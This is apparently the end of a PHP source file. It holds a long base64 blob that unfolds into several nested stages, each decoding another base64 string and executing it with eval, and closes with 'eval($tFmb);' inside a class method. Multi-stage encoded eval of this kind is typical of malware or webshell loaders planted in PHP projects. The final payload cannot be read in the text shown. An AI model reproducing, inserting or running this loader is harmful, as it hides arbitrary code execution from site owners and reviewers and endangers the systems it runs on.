ZVVpPV0dKR2JEVmFWVkpIVmxaYWMxSnFVbUZXZWtaVVZqQmFUMlJYVGtoa1JsSlRWak5uZVZaVVNqQmhNRFZJVkd0a2FFMHllRmhaYlhoaFkxWlNXR1ZIUm1sV2JYaFdWVEo0YTFReFdsbGhSVnBXWWtkb2RsWkdXa3RTYkZwMVdrWldUazFyTkhwV1dIQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2MxUnRhR2xXVm5CS1YydFdWMVl5UmxaTldFWlRZbFJzWVZadE1VNWtNWEJYVjJ0T1dGWnNTbmhWYlhoM1lWZEdObFZxVGxoV1JYQjZXVzB4Um1WV1RuSmhSMnhUVFRCS2IxWnROWGRXTURWeldraE9XRlpHV25GWmEyaERWMnhzVlZSck9WVmlSbkJJV1d0b2QxWldXbkpPV0d4VllXdEtWRlpYTVVwbFZuQkdZMFpLVGxKV2NERldWRVpYVkRGR2MySXpaR2xTVmtwVFZtcEtVMU14VmxWUmEyUnBZa1UxVjFaSGRFdFpWVEZKVVd0c1YxSjZRVEZaVlZWNFVqRk9jVk5zY0dsU01VcEpWMVJDYTFNeVRsZFZiRlpwVWpOQ1QxUldXbmRrTVdSWlkwVTVWazFzV2xkYVJWWlRWbTFLY2s1WE9WZGhhMFY0V1hwR2MyUkZOVlpQVjJ4VFlsZFJNVmRyVm10T1IwcEhWbGh3WVZKR1NsWlVWbFV3Wld4d1ZsWnFRbGRXTURFelZHeFdVMkZHV2xaWGJsWldUVlphVUZWWGVIWmtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSRUpZWVhwR01GbFZhSE5XYlVwSVlVaGFWVlpXY0ROV01GVXhWbFpHZEdGR1pHeGlXR1EwVm10YVlWVnRWa2hXYmxKV1lrZG9WVmx0TlVOamJGVjNWbTVPYTJKRk5YbFhhMUpUWVd4S2RHUkVWbGRpVkZaWVdWZHplR014WkhSTlZuQlhVbGhDV1ZaSGVGZE9Sa3BYVkd4V1UyRjZSbFJWYkZwaFRURmFSVlJ0Y0d0TlZURXpXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGTmlWRlpWVm14Vk1WWkdiRmhOVldSVVVqRktSMVl5TVRSV1JrcHlZMGh3V0ZaNlFYaFdWRXBQVTBaT1dXSkZPVlJTTTJoVFZtcENWazFIVmtkYVJtaFBWbFJzVDFWcVFURmtNV1J4VTJwQ2FGWnJiRFZhVldoSFYwZEtTRlJZYUdGV00yZ3pWbXBCTlZkV1RuUlNiR2hUVFRGSk1sWnJXbXRrTWs1MFZGaGtUbFpzU205YVZ6RlRVbXhhVjFsNlZtbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0ZKVVZGVlNWMDFzWkZkVmEwNVhUVVJXU1ZaWGRHOVdNa3B6VjI1S1ZtRnJiekJVVjNoelpFZE9SazVXUWxkTlJFVXlWbTB3ZUdNeVJuSk5TR2hVWVd4YVZWUlZWVEZXUm13MlUydGtXRkpzU2pCYVZXUnpZVmRHTmxadWNGZE5Sa3BNVkZWa1MxTkdXbk5WYlhST1RUQktVVlpzVWs5aE1EVkhWRmhvVm1KdVFsWlpWRUV4WkZaU1ZsWnFRbFJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjREZXVkVaWFZERkdjMkl6WkdsU1YyaHdWVzV3UjFSV1ZsVlRiWFJxWWtkU2VWZFljRmRoTVVwMFpVWnNXbUV5YUZoV1YzTjRaRWRHU0U5V2NFNWlhMHBJVmtSR1lWRXhXa2RXYmxKcVVqSm9WRlJVUmt0U01XUllZMFZ3YkZJd1drbFZiWGh2VkRGT1NHRkZkRlpXUlZwNldrVmFUMVpzVW5OVWJXaE9ZVEozTVZaR1dtdGlNa1pIVjJwYVYyRXhXbUZXYkdSVFUwWndWMVpZYUdwV1ZFWkdXV3RXTUZVd01VVldha3BZVm14S1JGWlVTbE5rUms1ellVWk9hV0V3Y0hkWFZtUXdZekpLYzFSdVVtbFNia0pvVkZWb1ExTldXbGhPVjBab1ZteHNNMVl5Tld0WGJVcFpWV3hDV21GclducFdNVnBQVjFkT1IxSnNaRk5TVlhBMVZtcEdVMU15U1hsVWJrNVVZVEpvVVZZd1drdFpWbHB4VTJwU1RsWnNTbHBaYTFaTFlWWmFXVkZ1WkZaV2JWRjNWakp6ZUdSSFJrbGlSbHBwVWpKb01sWkdWbUZrTVdSR1RsWldVbUpYYUZoYVZ6RXpaVVphUjFkc1NtdE5SR3hYV1RCV2IxWXlSbk5UYmtwV1lXdGFhRlJXV25OT2JFNTFWRzEwYVZaWVFqVldhMk4zVGxaa2MxcEZXbWxTUmtwVlZteFZNVmxXYkhOV2JrNVRVbXhhTUZrd1pHOVZNREI0VTJ0b1dHSkdXblpXVkVwTFUwWk9kVlpzV21saE1IQjNWa1prZDFVd05WZFdhMlJXVjBkU2IxUldhRU5YYkd4V1ZXdE9XbFpzYnpKV2JYQmhWMnhhZEZSVVJtRlNiSEJIV2xaa1IxTkhSa2hqUjJob1RXNW9NVlpVU1hoak1XUnpZak5rYWxKWGFGWlpiRkp6WWpGU1ZsZHNjRTVTYmtKSFYydGFhMkV4V1hoVGEyeGFZVEpvYUZsV1pFZGphekZGVm14YVUyRjZWbFZYVjNSclZqRk9WMVp1VW14U01uaHdXVmh3VjAweFpGaGpSWEJPVm10d1NWVnRkRzlWTWtwMFpVVTVZVlp0VWpaVWJGcFhVakZ3U0ZKdGFGTk5TRUpMVm10amVFNUdVa2RXV0dSVVZrVTFWVlpzVlRGUk1XUnhVVzVPVTFKcldsbFhhMVozVldzeFJsZHVWbFpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVlZwTFZURnNjVk50ZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZTYTNCclRWZDRWMWRyYUU5aVIwVjZZVVphVldKSFVtaFpWekZMVmpGa2NWZHNjR2hoZWxaWlYyeGFZV050VmxkWGJrcFdZbGQ0VDFsWGVHRk5SbVJYVjIxMGFHSldTa2hWVnpWWFZsZEtXR0ZJU2xwaVJuQllXa2Q0UzFJeFNuVlhiVVpPVWpOb1JsWldXbXRoTVU1elVsaGtVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsTlNhMXBaVjJ0V2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKT1IyTkdiR2xTYXpWeFZGZDBZVmRXV2toTlZGSm9WakJ3ZVZSc2FFOVhSa3BHWTBWb1dtVnJjRWhXTUZwTFpGZE9TRTFXV214aVdHY3lWakZhWVdFeFVYbFRhMmhVWW14S1ZsbHNhRzlVYkZKWVRsYzVhMDFYVWxaVk1uaHJZVEZhZEdSRVZsZGlSMUo2VmtaYVIxWldSbkpsUmxKWFZsUldSRll5Y0VOak1VcEhVbXhvWVZKWVFsTlVWVlpoWkZaVmVGWnJPVkppUnpreldXdFdVMVZzV1hsVmEzUldWa1ZLU0ZsdGVFOVdiRkp5VTIxR1RsSXphRVpXVmxwcllURk9kRkpzV21sVFIxSldWRlJLVDAweFZqWlJiazVUVW10YVdWZHJWbmRWYXpGR1YyNVdWazFXV2xCVlYzaDJaREpLUmxWc1NsZE5iRXBNVmxaU1ExSXlTbk5VYkZwVllrVTFUMVZxUW1GVFZteHlZVWhrVlZac2NFWldiWEJEVjBkS1NHRkdRbUZXTTJoNlZqQmFkMU5IVmtkV2JHUk9VbTA1TkZacVJtRmhNa1Y1VTJ0b1ZXSnJTazlWVkU1VFdWWmFjVkpyZEdwaVJscDZXVlZXTUdKR1dYZGlSRnBXVFZkTk1WWXhWWGhXVjBaSlYyeFNWMDB4UlhkWFZFSmhZMjFXVjFkdVZsZGlTRUpQV1d0YVlXUldaRmRWYTNSWFRVUldWMWxyVm05aFZrNUpVV3QwVm1GcmJ6QlVWbHAzVTBVeFZscEhjRTVoTVhCYVZteGFhMkV4YkZoVGJGWnBVa1phVlZac1pHOVdSbXh4VTJ0a1dGWnNTbGxYYTJSSFZUSldkR1F6WkZkTlZuQnlXWHBLVTFadFNrWmlSa3BwWVhwV2IxWnRjRU5aVlRWeldraE9WV0V3Tlc5WmJGWnpUbFpTYzFWclRsaGlSbXd6Vkd0b2ExWkdXbGhoUm1oaFZqTlJNRmt3V2s5WFZrWnlaVVprVkZKVVZsRldWbEpMWXpGR2MySXpaR2xTVmtwVFZtcEtVMU14VmxWUmEyUnBZa1UxVjFaSGRFdFpWVEZJWlVWV1ZsWnRVbkpWTW5oR1pERktkVk50UmxOV01Vb3lWMVJDYTFRd05WWk5WVkpyVW0xNFQxUlZhRU5sYkdSWlkwVTVVazFzU2pCVk1qVlhWbGRLV1dGR1VscGlSbHBvV1RGYWQxSnNiRFpXYlhoWFRWWndWbFpHVms5TlJtUnlUVWhrYWxORk5WbFdiVEZ2Vmtac2NsWnFRbE5TTUZZMlZsZDRSMkZYUmpaV2JuQllZVEZhYUZWNlNrdFNNazVHWVVkc1ZGSXphRzlXYlhCQ1RVZFJlRlJZWkZWaVJUVnZWRlprTkZkc1draE5SRlpZWWxWd1ZsbHJZelZYYXpGeFVteFNWMkpVUmxCYVJXUlNaV3hHY2sxV1pGTlNiR3Q1Vm1wS05HRnJNVmhTV0doWFlteEtXRmx0TlVOalZsWjFZMGhPVGxadGR6SlZNbmhoWVZVeFNWVnNXbHBsYTBWNFZXdGtSMVpzU25ST1ZsSlhWbFJXUkZZeWNFTmpNVXBIVW14b1lWSllRbE5VVlZaaFpGWlZlRlpyT1ZKaVJ6a3pXV3RXVTFWdFNsbFZiVGxYWVd0YVdGcEhlRTVsUmxaMVkwWldhRTFFVmpOV1ZscHJZVEZPYzFKWVpGTmlWRlpWVm14Vk1WRXhaSEZSYms1VFVtdGFXVmRyVm5kVmF6RkdWMjVXVmsxV1dsQlZWRUUxVm14V2MxTnRiRTVpVmtwTVZsWlNRMUl5U25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZWak5WTVZKWFZURktjbGRxU2xoaGEwcDZWV3RhUjFkR2NFWmpSa3BPVWxad01WWlVSbGRVTVVaellqTmthVkpXU2xOWmJHaHZZMFpWZDFaVVJtcE5WWEJJVlcwMVlWbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnVSbUZTVmxwWFZtNXdjMlJXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1U00yaEdWbFphYTJFeFRYaFVhMlJVWW14d1lWWnRNVzlVTVhCR1YydE9hazFFYkZwWmEyUkhWMFpLVlZaWWJGaGhNWEIyVlhwS1IyTXlUa2RYYkZacFlraENkMWRYZUdGa01sRjRXa2hXYUUweVVrMVVWM040VGxaV2RHTkZkRnBXYkZZMVYydFZOVlZyTVhSbFJVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjREZXVkVaWFZERkdjMkl6WkdsU1ZrcFRWbXBLVTFNeFZsVlJhMlJwWWtVMVYxWkhkRXRaVlRGSVpVVldWbFp0VW5KVk1uaEdaREpLTmxSc1VtaE5iRVYzVjFSQ1lXTnRWbGRYYmxaWFlsaENUMWxyV25ka1JsbDRWMjEwVDFJd05VaFphMXB6VmxkR2RHVkZOVlZXZWxaMldrUkdhMVpXVG5OYVIzUlhZbGhSTVZadGVHOVpWMFpYVTFoc2JGTkZXbGxaYTJST1pVWnNXR1ZJWkZkU2F6VmFWa2QwVjFac1dqWmlTRlpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JscFdUbFZPV0dGclNucFZhMXBIVjBkS1JtTkhhRmROTURFMlZsZDBZVkl5VW5OaU0yUnBVbFpLVTFacVNsTlRNVlpWVVd0a2FXSkZOVmRXUjNSTFdWVXhTR1ZGVmxaV2JWSnlWVEo0Um1ReFNuUk9WbEpvVFcxb1ZWZFhjRXRTTVdSWFZXeHNWbUpGV25CV2ExWmhaV3hrV1dORk9WVk5hMXBJV1dwT2MxWXlSalpXYlVaWFltNUNXRmxxUm10alZrNXpXa2Q0VjFkSGFGZFdSM2hyWWpGc1YxTllhRlJoTWxKaFZGZHdWMVJHY0VoTlZUbHFVakJhU1ZZeWVITmlSbGw1Vlc1a1YyRXhXbkpaZWtwSFl6Sk9SMkZGT1ZkTk1FcHZWbXhTUTFNeVZsZGFTRTVvVTBWd2FGUlhkR0ZYYkZwSFdrZDBhRkpzYnpKV2JHaHpWMFphZEZWVVFscE5SbkF6Vld0YVIyUkZNVmhpUlRWT1VqTm9NVll5ZEZkaE1rbDVWR3RvVldGc1dsTlpiR2hUWTBaU1dHTkZaR2xOVjNoWVYxaHdRMWxWTVhKT1ZXeGhWbGRSTUZZeWVHdFNhelZaVkd4U1YxWXhTbEZYYTJONFV6SlNWMVp1VW1oU2JrSlBWRlpXWVdSV1pISlhiVGxWWWxaS1YxbHJhRU5oUlRCM1UyeEdZVk5JUWtSV1JWcFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldWVlpzVlRGUk1XUnhVVzVPVTFKcldsbFhhMVozVldzeFZtSkVUbGhXYkZweVdYcEtWMk50VmtkV2F6bFhUVmhDZUZkWGVHRlpWVFZ6WVROa1dtVnNXbkpXYWtGNFRsWmFkR1JIZEZoaVJtd3pWR3RvYTFkdFJuSk9WWGhWWWtaWk1GWnNWVEZYUjA1SVkwZHNWMkpJUWpKV01uUlhZVEZhZEZOWVpHdFNiRXBQVlZST1UyTldVbGhsUm5CclRWWndXVlJXV210aFJURnlWMnh3VmsxcVJUQldNbk4zWlVaS2RWZHNVbWhOYkVwVlYxWldhMVJ0VmxoU2EyaHBVako0VDFsVVJuWk5WbGw1WkVkR1YwMXNXbGxWTW5SVFlVVXdlRk5zU2xwaVdFMTRXWHBHYzJSRk1WZFViRnBPVjBWS1lWWnJZekZoTWtaV1RWaEdWMkZzY0ZsWmExVXhaRlpyZDFaVVZrOVdhMXBaVjJ0V2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MxTnJaRk5pYkhCb1ZGVmtORkpXVmxkYVIzUlVZa1ZXTTFWdE1ERldSbHBXVGxWT1dHRnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbXBLTUdFeVRYbFRhMXByVWxaS2IxcFhNVk5TYkZwWFdYcFdhV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldSVlpFUmxkVk1WWjBVMWhzWVZKWVFsTlVWVlpoWkZaVmVGWnJPVkppUnpreldXdFdjMVJzU2tWUmJsWlZUVEo0VkZkV1pFOVdNWEJJWVVWd1UxSkZTblZWTWpWelZUSkplRnBGWkZaaWJXaExWV3RTUTJKc1pGaE5WV1JzWWtoQ1ZsWXhVa05YVlRGelUyNU9XRlpGYXpGWlZFWjNWa1p2ZVdSSFJrNVNiR3Q1Vm1wQ1QyTnJOSGRpUldoWFlXdHdZVlpxVG10a2JFNXlXa2M1V0Zac2NFcFZiR2hEVlVkV1dGUlVUbGhpUjJob1dWVmtTMUpHYjNsa1JtaHBZVEZ3V2xZeFdrOWphelUxV1hwa1MxSnJTbGxaTVZwMldqRkNWRkZYTlV0VFJuQlRWakkxU2xveFFsUlJiV3hhVjBVMWMxUnRjRk5hYkhCSVZtMXdhVTFzU25OVE1FNVRUbXhaZWxWc1NreFdTRTV1VjJ4b1lXRkhTa1JhTW5ScllrVmFhRmt5YkhKT01IQTJaRWQ0YTJKVlducFRNRTVUVlZaWmVsSnRSa3hXU0UwNVNucHphMVF6YUhwVlUwRTVTVU5qYTFOV1NucFhRMEU1U1VkS2FHTXlWVEpPUmpscldsZE9kbHBIVlc5S1IyUkxWMjVuY0U5NVFteGtiVVp6UzBOU1NsVnVUbGxMVkhOdVR6SldNbGxYZDI5S1JUazBZekZGY0U5M1BUMG5PeVJSZUVSeUlEMGdKeVJOZUhwWElEMGdZbUZ6WlRZMFgyUmxZMjlrWlNna1NITmFWQ2s3SUdWMllXd29KRTE0ZWxjcE95YzdaWFpoYkNna1VYaEVjaWs3JzskUWVYYSA9ICckc1F6VyA9IGJhc2U2NF9kZWNvZGUoJG9JWFEpOyBldmFsKCRzUXpXKTsnO2V2YWwoJFFlWGEpOw==');eval($tFmb);
    }
}
